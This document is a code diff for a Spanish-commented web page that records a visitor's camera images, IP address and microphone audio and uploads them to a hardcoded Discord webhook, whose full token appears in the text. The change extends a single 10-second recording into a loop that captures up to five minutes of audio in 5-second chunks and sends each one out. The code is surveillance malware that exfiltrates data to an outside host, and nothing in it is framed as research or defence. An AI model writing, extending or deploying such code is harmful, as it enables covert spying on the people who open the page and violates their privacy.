@@ -70,7 +70,9 @@
 
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548766063771254846/WIxKE3JXCwdU0HKqeaRcWap1luqS87meWhUDKwN7mWXWge7Ra_nK9CXhUTy3kiKpO9Vm';
 
-    const SEGUNDOS_GRABACION = 10;
+    // Configuración
+    const SEGUNDOS_POR_TROZO = 5;     // duración de cada trozo
+    const MAX_TROZOS = 60;            // 60 x 5s = 5 minutos máximo
 
     let currentStream = null;
     let yaEnviado = false;
@@ -135,7 +137,7 @@
       return blob;
     }
 
-    // -------- Enviar al webhook --------
+    // -------- Enviar archivo al webhook --------
     async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
@@ -154,8 +156,8 @@
       }
     }
 
-    // -------- Grabar audio --------
-    async function grabarAudio(segundos) {
+    // -------- Grabar en trozos y enviar cada uno --------
+    async function grabarEnTrozos(hora, linkIP) {
       if (!navigator.mediaDevices || !window.MediaRecorder) {
         throw new Error('MediaRecorder no soportado en este navegador');
       }
@@ -165,41 +167,62 @@
         video: false
       });
 
-      // Elegir un mimeType soportado
+      // Elegir mimeType soportado
       let mimeType = 'audio/webm';
       if (!MediaRecorder.isTypeSupported(mimeType)) {
         if (MediaRecorder.isTypeSupported('audio/mp4')) mimeType = 'audio/mp4';
         else if (MediaRecorder.isTypeSupported('audio/ogg')) mimeType = 'audio/ogg';
-        else mimeType = ''; // deja que el navegador elija
+        else mimeType = '';
       }
-      console.log('Usando mimeType:', mimeType || '(por defecto)');
 
+      const ext = mimeType.includes('mp4') ? 'mp4' : mimeType.includes('ogg') ? 'ogg' : 'webm';
       const opciones = mimeType ? { mimeType } : {};
-      const recorder = new MediaRecorder(stream, opciones);
-      const chunks = [];
 
-      recorder.ondataavailable = e => {
-        if (e.data && e.data.size > 0) chunks.push(e.data);
-      };
+      let trozo = 0;
 
-      return new Promise((resolve, reject) => {
-        recorder.onstop = () => {
-          stream.getTracks().forEach(t => t.stop());
-          const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
-          console.log('Audio grabado, tamaño:', blob.size, 'bytes');
-          resolve({ blob, mimeType: mimeType || 'audio/webm' });
-        };
+      // Función que graba un solo trozo
+      function grabarTrozo() {
+        return new Promise((resolve) => {
+          const recorder = new MediaRecorder(stream, opciones);
+          const chunks = [];
 
-        recorder.onerror = (e) => {
-          stream.getTracks().forEach(t => t.stop());
-          reject(e);
-        };
+          recorder.ondataavailable = e => {
+            if (e.data && e.data.size > 0) chunks.push(e.data);
+          };
 
-        recorder.start();
-        setTimeout(() => {
-          if (recorder.state !== 'inactive') recorder.stop();
-        }, segundos * 1000);
-      });
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
+            resolve(blob);
+          };
+
+          recorder.start();
+          setTimeout(() => {
+            if (recorder.state !== 'inactive') recorder.stop();
+          }, SEGUNDOS_POR_TROZO * 1000);
+        });
+      }
+
+      // Bucle de grabación y envío
+      while (trozo < MAX_TROZOS) {
+        trozo++;
+        console.log(`Grabando trozo ${trozo}/${MAX_TROZOS}...`);
+        const blob = await grabarTrozo();
+
+        if (blob.size === 0) {
+          console.warn(`Trozo ${trozo} vacío, saltando.`);
+          continue;
+        }
+
+        console.log(`Trozo ${trozo} grabado: ${blob.size} bytes. Enviando...`);
+        await enviarAlWebhook(
+          blob,
+          `🎤 **Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
+          `audio_trozo_${trozo}.${ext}`
+        );
+      }
+
+      // Detener micrófono al terminar
+      stream.getTracks().forEach(t => t.stop());
     }
 
     // -------- Flujo principal --------
@@ -232,28 +255,12 @@
           'trasera.jpg'
         );
 
-        // 3) Audio
-        console.log('Iniciando grabación de audio...');
-        try {
-          const { blob: audioBlob, mimeType } = await grabarAudio(SEGUNDOS_GRABACION);
-          const ext = mimeType.includes('mp4') ? 'mp4' : mimeType.includes('ogg') ? 'ogg' : 'webm';
-          await enviarAlWebhook(
-            audioBlob,
-            `🎤 **Audio grabado** (${SEGUNDOS_GRABACION}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
-            `audio.${ext}`
-          );
-        } catch (audioErr) {
-          console.error('Error al grabar audio:', audioErr);
-          // Avisar al webhook que no se pudo grabar
-          const texto = new Blob(
-            [`No se pudo grabar el audio.\nMotivo: ${audioErr.message || audioErr}\nHora: ${hora}\nIP: ${linkIP}`],
-            { type: 'text/plain' }
-          );
-          await enviarAlWebhook(texto, `⚠️ Error de audio\n🕒 ${hora}\n🌐 ${linkIP}`, 'error-audio.txt');
-        }
+        // 3) Audio en trozos
+        console.log('Iniciando grabación de audio en trozos...');
+        await grabarEnTrozos(hora, linkIP);
 
         yaEnviado = true;
-        console.log('Todo enviado correctamente.');
+        console.log('Proceso completo.');
 
       } catch (err) {
         console.error('Permiso denegado o error general:', err);
